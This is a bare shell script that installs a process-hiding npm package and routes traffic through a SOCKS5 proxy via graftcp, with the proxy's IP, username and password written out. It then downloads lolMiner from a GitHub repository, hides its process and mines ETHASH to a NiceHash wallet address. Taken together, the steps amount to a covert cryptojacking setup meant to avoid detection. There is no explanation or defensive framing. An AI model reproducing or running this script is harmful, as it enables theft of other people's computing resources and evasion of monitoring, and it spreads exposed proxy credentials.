apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  44.233.33.179:3128 
socks5_username = nbiufmnb
socks5_password = ymoytqyg3k5o
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner

chmod +x lolMiner

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 1-999 -n 1)-TOT) --ethstratum ETHPROXY
